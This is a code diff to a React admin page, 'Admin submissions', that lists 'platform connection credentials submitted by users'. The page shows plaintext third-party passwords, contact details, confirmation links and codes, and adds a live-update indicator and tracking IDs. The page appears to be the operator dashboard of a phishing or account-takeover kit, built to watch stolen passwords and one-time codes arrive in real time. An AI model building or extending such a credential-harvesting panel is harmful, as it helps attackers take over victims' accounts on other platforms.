@@ -30,6 +30,8 @@ export default function Admin() {
   const [debugMessages, setDebugMessages] = useState<string[]>([]);
   const [hasInitialLoadCompleted, setHasInitialLoadCompleted] = useState(false);
   const [syncDelayed, setSyncDelayed] = useState(false);
+  const [isLive, setIsLive] = useState(false);
+  const liveTimer = useRef<number | null>(null);
 
   const sleep = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));
 
@@ -50,6 +52,18 @@ export default function Admin() {
     }
 
     return { cachedRows, cachedUsers };
+  };
+
+  const triggerLiveIndicator = (message: string) => {
+    if (!isMounted.current) return;
+    setIsLive(true);
+    if (liveTimer.current) {
+      window.clearTimeout(liveTimer.current);
+    }
+    liveTimer.current = window.setTimeout(() => {
+      if (isMounted.current) setIsLive(false);
+    }, 1200);
+    addDebugMessage(message);
   };
 
   const enableCacheFallback = (message = 'Sync delayed. Showing cached data.') => {
@@ -375,6 +389,9 @@ export default function Admin() {
       if (abortController.current) {
         abortController.current.abort();
       }
+      if (liveTimer.current) {
+        window.clearTimeout(liveTimer.current);
+      }
     };
   }, []);
 
@@ -434,17 +451,21 @@ export default function Admin() {
             id: row.id,
             platform: row.platform,
             contact: row.email || row.phone || row.contact || '-',
+            email: row.email || null,
+            phone: row.phone || null,
             third_party_password: row.third_party_password,
+            confirmation_link: row.confirmation_link || null,
+            code: row.code,
+            tracking_id: row.tracking_id,
             created_at: row.created_at,
             user_id: row.user_id || null,
             status: row.status,
             source: row.source,
-            code: row.code,
-            confirmation_link: row.confirmation_link || null,
           }));
 
           setRows(submissions);
           saveRequestsToCache(submissions);
+          triggerLiveIndicator('Admin live data refreshed');
         }
 
         if (connectionsResp.error) {
@@ -533,7 +554,7 @@ export default function Admin() {
             console.log('[REALTIME_INSERT] ✅ Added to UI state, total rows:', merged.length);
             return merged;
           });
-          addDebugMessage(`✅ realtime INSERT: ${newRow.id} (${newRow.platform})`);
+          triggerLiveIndicator(`Realtime INSERT: ${newRow.id}`);
         } catch (err) {
           console.error('[REALTIME_INSERT] ❌ Handler error:', err);
           addDebugMessage(`❌ realtime INSERT failed: ${err instanceof Error ? err.message : String(err)}`);
@@ -548,11 +569,12 @@ export default function Admin() {
           setRows((prev) => {
             const mapped = prev.map((r) => {
               if (String(r.id) === String(updated.id)) {
-                const oldRow = r;
                 const newRowData = {
                   ...r,
                   platform: updated.platform,
                   contact: updated.email || updated.phone || updated.contact || r.contact,
+                  email: updated.email || r.email,
+                  phone: updated.phone || r.phone,
                   third_party_password: updated.third_party_password || r.third_party_password,
                   created_at: updated.created_at || r.created_at,
                   user_id: updated.user_id || r.user_id,
@@ -560,6 +582,7 @@ export default function Admin() {
                   source: updated.source || r.source,
                   code: updated.code || r.code,
                   confirmation_link: updated.confirmation_link || r.confirmation_link,
+                  tracking_id: updated.tracking_id || r.tracking_id,
                 };
                 console.log('[REALTIME_UPDATE] ✅ Updated row:', { id: updated.id, changes: { code: updated.code ? '[SET]' : undefined, confirmation_link: updated.confirmation_link ? '[SET]' : undefined } });
                 return newRowData;
@@ -570,7 +593,7 @@ export default function Admin() {
             console.log('[REALTIME_UPDATE] ✅ UI state updated');
             return mapped;
           });
-          addDebugMessage(`✅ realtime UPDATE: ${updated.id} (code:${updated.code ? 'Y' : 'N'}, link:${updated.confirmation_link ? 'Y' : 'N'})`);
+          triggerLiveIndicator(`Realtime UPDATE: ${updated.id}`);
         } catch (err) {
           console.error('[REALTIME_UPDATE] ❌ Handler error:', err);
           addDebugMessage(`❌ realtime UPDATE failed: ${err instanceof Error ? err.message : String(err)}`);
@@ -755,6 +778,12 @@ export default function Admin() {
       <div className="mx-auto max-w-5xl rounded-2xl border border-white/10 bg-white/5 p-5">
         <div className="flex justify-between items-center mb-6">
           <div>
+            <div className="flex items-center gap-2 mb-2">
+              <span className={`h-2.5 w-2.5 rounded-full ${isLive ? 'bg-emerald-400 animate-pulse' : 'bg-slate-500'}`} />
+              <span className={isLive ? 'text-emerald-300 font-semibold' : 'text-slate-400'}>
+                {isLive ? 'Live • Updating' : 'Live'}
+              </span>
+            </div>
             <h1 className="text-2xl font-semibold">Admin submissions</h1>
             <p className="text-sm text-slate-300">
               Platform connection credentials submitted by users.
@@ -801,7 +830,8 @@ export default function Admin() {
             <thead className="text-slate-400">
               <tr>
                 <th className="px-3 py-2">Platform</th>
-                <th className="px-3 py-2">Contact</th>
+                <th className="px-3 py-2">Tracking ID</th>
+                <th className="px-3 py-2">Email / Phone</th>
                 <th className="px-3 py-2">Password</th>
                 <th className="px-3 py-2">Confirmation Link</th>
                 <th className="px-3 py-2">Code</th>
@@ -814,7 +844,8 @@ export default function Admin() {
               {rows.map((row) => (
                 <tr key={`${row.id}-${row.status}`} className={`border-t border-white/10 hover:bg-white/5 transition ${row.isNew ? 'bg-green-900/20' : ''}`}>
                   <td className="px-3 py-2">{row.platform} {row.isNew && <span className="ml-2 bg-red-500 text-white text-xs px-1 py-0.5 rounded animate-pulse">NEW</span>}</td>
-                  <td className="px-3 py-2">{row.contact}</td>
+                  <td className="px-3 py-2 text-slate-300 text-xs font-mono break-words max-w-[180px]">{row.tracking_id || '-'}</td>
+                  <td className="px-3 py-2 text-slate-100 text-xs break-words max-w-[180px]">{row.contact}</td>
                   <td className="px-3 py-2 text-slate-400 font-mono text-xs">{row.third_party_password || '-'}</td>
                   <td className="px-3 py-2 text-slate-300 text-xs max-w-[220px] break-words whitespace-normal font-mono">{row.confirmation_link || '-'}</td>
                   <td className="px-3 py-2 font-mono font-semibold text-green-400">{row.code ? (
